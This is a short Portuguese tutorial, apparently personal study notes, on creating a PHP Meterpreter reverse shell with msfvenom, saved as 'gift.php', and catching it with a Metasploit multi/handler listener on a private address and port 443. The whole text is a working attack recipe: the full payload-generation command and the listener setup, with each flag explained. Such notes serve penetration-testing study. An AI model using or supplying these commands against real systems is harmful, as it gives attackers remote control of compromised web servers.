# Criando o reverse shell

msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.100.140 LPORT= 443 -f raw > gift.php

### msfvenom
ferramenta do metasploit que gera payloads

### -p php/meterpreter_reverse_tcp

flag que diz qual payload gerar, nesse caso um tcp reverso em php e quem vai receber a conexão é o meterpreter

### LHOST=(seu propio IP)
define quem vai receber a conexão

### LPORT=(a porta que vc vai escutar)
em que porta o host vai escutar

### -f raw
define que o formato sai em texto puro, sem nem um encapsulamento

# Esperando a conexão

### msfconsole
inicia o metasploit
### use exploit/multi/handler
fala para usar o modulo handler, que é um ouvinte que espera conexão

### set payload php/meterpreter_reverse_tcp
Espere uma conexão que fale o protocolo do Meterpreter em PHP via reverse TCP 

### set LHOST=192.168.100.140
ip a ser escutado
### set LPORT= 443
porta a ser escutada
### run
roda o script